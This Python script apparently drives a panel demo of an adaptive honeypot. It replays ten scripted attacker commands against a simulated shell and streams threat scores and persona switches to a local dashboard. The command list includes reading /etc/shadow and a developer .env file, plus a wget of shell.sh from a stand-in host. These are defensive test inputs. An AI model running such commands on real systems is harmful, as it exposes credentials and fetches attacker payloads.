"""Sprint 6 — Live Demo Script for Panel Presentation.

Simulates the exact 10-command demo sequence designed for the panel.
Runs with a 1.5-second delay between commands so the panel can follow.
Sends data to the dashboard via HTTP POST so the browser dashboard
updates in real time.

Usage::

    # Terminal 1: Start the dashboard
    python -m uvicorn dashboard.app:app --host 0.0.0.0 --port 8080

    # Terminal 2: Run the demo
    python scripts/demo_session.py

The panel watches the dashboard in the browser while this script runs
in a visible terminal window.
"""
from __future__ import annotations

import sys
import time
from datetime import datetime, timezone
from pathlib import Path

# Fix Windows console encoding for Unicode characters
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Add project root to path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

import requests
from honeypot.cowrie_hook import create_dispatcher
from event_logging.session_logger import SessionLogger


# ---------------------------------------------------------------------------
# Dashboard API Client
# ---------------------------------------------------------------------------

DASHBOARD_URL = "http://127.0.0.1:8080"


def dashboard_post(endpoint: str, data: dict) -> bool:
    """Send data to the dashboard via HTTP POST. Returns True on success."""
    try:
        resp = requests.post(f"{DASHBOARD_URL}{endpoint}", json=data, timeout=2)
        return resp.status_code == 200
    except Exception:
        return False


def check_dashboard() -> bool:
    """Check if the dashboard is running."""
    try:
        resp = requests.get(f"{DASHBOARD_URL}/api/stats", timeout=2)
        return resp.status_code == 200
    except Exception:
        return False


# ---------------------------------------------------------------------------
# ANSI colors
# ---------------------------------------------------------------------------

RESET  = "\033[0m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
RED    = "\033[31m"
CYAN   = "\033[36m"
MAGENTA= "\033[35m"
WHITE  = "\033[37m"
ORANGE = "\033[38;5;208m"
BG_DK  = "\033[48;5;234m"

# Level colors
LEVEL_COLORS = {
    "low": GREEN,
    "medium": YELLOW,
    "high": ORANGE,
    "critical": RED,
}

# Category colors
CAT_COLORS = {
    "benign": GREEN,
    "reconnaissance": GREEN,
    "exploration": YELLOW,
    "privilege_escalation": ORANGE,
    "exfiltration": RED,
    "lateral_movement": MAGENTA,
}


# ---------------------------------------------------------------------------
# Demo command sequence — exactly 10 commands
# ---------------------------------------------------------------------------

DEMO_COMMANDS = [
    ("whoami",                          "Who am I on this system?"),
    ("id",                              "Check user and group info"),
    ("uname -a",                        "System identification"),
    ("cat /etc/passwd",                 "Enumerate users"),
    ("sudo -l",                         "Check sudo privileges"),
    ("cat /etc/shadow",                 "Attempt to read password hashes"),
    ("wget http://10.0.0.1/shell.sh",   "Download attacker toolkit"),
    ("ls /home",                        "Check for other users"),
    ("cat /home/john.dev/.env",         "Read developer credentials"),
    ("ps aux",                          "Full process enumeration"),
]


# ---------------------------------------------------------------------------
# Demo runner
# ---------------------------------------------------------------------------

def run_demo() -> None:
    """Run the live demo for the panel presentation."""

    # Print banner
    print(f"\n{BOLD}{GREEN}")
    print(f"  +==============================================================+")
    print(f"  |           ADAPTIVE HONEYPOT -- LIVE DEMO                     |")
    print(f"  |                                                              |")
    print(f"  |   Simulating an attacker session in real time.               |")
    print(f"  |   Watch the dashboard at http://localhost:8080               |")
    print(f"  +==============================================================+")
    print(f"{RESET}\n")

    # Check dashboard connection
    dashboard_ok = check_dashboard()
    if dashboard_ok:
        print(f"  {GREEN}>>> Dashboard connected -- live updates enabled{RESET}")
    else:
        print(f"  {YELLOW}!!! Dashboard not running -- console output only{RESET}")
        print(f"  {DIM}  Start dashboard first: python -m uvicorn dashboard.app:app --port 8080{RESET}")

    print()
    print(f"  {DIM}Press Enter to begin the demo...{RESET}", end="")
    input()
    print()

    # Clear previous dashboard data
    if dashboard_ok:
        print(f"  {DIM}Clearing previous dashboard data...{RESET}")
        dashboard_post("/api/dashboard/clear", {})
        time.sleep(1) # wait for the websocket push to clear the UI

    # Create dispatcher
    logger = SessionLogger(
        log_dir=str(PROJECT_ROOT / "event_logging" / "logs"),
        logger_name="demo_session",
    )
    dispatcher = create_dispatcher(
        session_id="demo-session",
        attacker_ip="185.220.101.42",
        attacker_port=48372,
        persona_name="generic_linux",
        session_logger=logger,
    )

    # Register with dashboard
    if dashboard_ok:
        dashboard_post("/api/session/start", {
            "session_id": "demo-session",
            "attacker_ip": "185.220.101.42",
            "persona": "generic_linux",
        })
        # Set fingerprint score
        dashboard_post("/api/fingerprint", {"score": 22, "total": 22})

    prev_persona = "generic_linux"
    prev_score = 0

    print(f"  {BG_DK}{BOLD} Attacker Session Started {RESET}")
    print(f"  {DIM}IP: 185.220.101.42 | Persona: generic_linux | Session: demo-session{RESET}")
    print(f"  {'~' * 70}\n")

    for i, (command, description) in enumerate(DEMO_COMMANDS, 1):
        # Show command being "typed"
        prompt = dispatcher.prompt
        print(f"  {GREEN}{prompt}{RESET}{BOLD}{command}{RESET}")
        print(f"  {DIM}  -> {description}{RESET}")

        # Execute
        response, source = dispatcher.dispatch(command)

        # Get state
        session = dispatcher.session
        score = session.threat_score
        history = session.command_history
        last_entry = history[-1] if history else {}
        delta = last_entry.get("score_delta", 0)
        category = last_entry.get("category", "benign")
        persona = dispatcher.persona_name

        level = "low"
        if score <= 20:
            level = "low"
        elif score <= 50:
            level = "medium"
        elif score <= 80:
            level = "high"
        else:
            level = "critical"

        # Print response (truncated)
        resp_lines = response.strip().splitlines()
        max_lines = 4
        for line in resp_lines[:max_lines]:
            print(f"  {DIM}  {line[:80]}{RESET}")
        if len(resp_lines) > max_lines:
            print(f"  {DIM}  ... ({len(resp_lines) - max_lines} more lines){RESET}")

        # Print score update
        lc = LEVEL_COLORS.get(level, WHITE)
        cc = CAT_COLORS.get(category, WHITE)
        delta_str = f"+{delta}" if delta > 0 else str(delta)

        print()
        print(f"  {BOLD}  Score: {lc}{score}/100{RESET}  "
              f"{RED if delta > 0 else DIM}({delta_str}){RESET}  "
              f"Level: {lc}{level.upper()}{RESET}  "
              f"Category: {cc}{category}{RESET}")

        # Persona switch detection
        if persona != prev_persona:
            print()
            print(f"  {BOLD}{ORANGE}  !!! PERSONA SWITCH !!!{RESET}")
            print(f"  {ORANGE}  {prev_persona} -> {persona}{RESET}")
            print(f"  {ORANGE}  The system is now presenting itself as a different environment!{RESET}")

            if dashboard_ok:
                dashboard_post("/api/session/switch", {
                    "session_id": "demo-session",
                    "from_persona": prev_persona,
                    "to_persona": persona,
                    "trigger_score": score,
                })
            prev_persona = persona

        # Send command to dashboard
        if dashboard_ok:
            dashboard_post("/api/session/command", {
                "session_id": "demo-session",
                "command": command,
                "score_after": score,
                "score_delta": delta,
                "category": category,
                "threat_level": level,
                "persona": persona,
                "response_source": source,
            })

        prev_score = score

        print(f"  {'~' * 70}")

        # Delay for panel to follow
        if i < len(DEMO_COMMANDS):
            time.sleep(1.5)

    # End session
    dispatcher.close()
    if dashboard_ok:
        dashboard_post("/api/session/end", {"session_id": "demo-session"})

    # Final summary
    print(f"\n  {BG_DK}{BOLD} Demo Complete {RESET}\n")
    print(f"  {BOLD}Session Summary:{RESET}")
    print(f"  {'~' * 50}")
    print(f"  Commands executed:    {len(DEMO_COMMANDS)}")
    print(f"  Final score:          {LEVEL_COLORS.get(level, WHITE)}{score}/100{RESET}")
    print(f"  Final level:          {LEVEL_COLORS.get(level, WHITE)}{level.upper()}{RESET}")
    print(f"  Final persona:        {persona}")
    print(f"  {'~' * 50}")
    print()
    print(f"  {GREEN}>>> The panel has just watched an attacker session play out in real time.{RESET}")
    print(f"  {GREEN}>>> Three proof points ready: fingerprint score, consistency, engagement.{RESET}")
    print()


if __name__ == "__main__":
    run_demo()
